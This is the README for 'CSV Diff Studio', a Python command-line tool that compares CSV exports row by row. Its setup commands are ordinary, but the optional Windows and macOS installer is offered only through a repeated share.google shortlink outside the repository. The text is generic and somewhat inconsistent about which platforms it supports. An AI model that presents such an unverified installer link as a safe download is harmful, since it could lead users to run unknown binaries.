![CSV Diff Studio](assets/hero.png)

# CSV Diff Studio

*Row-level diffs for CSV exports from sheets, CRMs, and databases.*

## What CSV Diff Studio is

This repository is **CSV Diff Studio**, a developer utility. Row-level diffs for CSV exports from sheets, CRMs, and databases.

Excel compare is noisy on large dumps. You need added / removed / changed by id, not a wall of red cells.

The CLI is the source of truth. The desktop build is optional if you do not want Python installed.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## What it does

- Join on one or more key columns
- Ignore column order and optional whitespace
- Export added, removed, and field-level changes
- Works on files larger than Excel likes to open

## Background

This CLI joins on a key column and writes a markdown or CSV report you can attach to a ticket.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/mark-1589/csv-diff-studio

MIT license. See `LICENSE`.
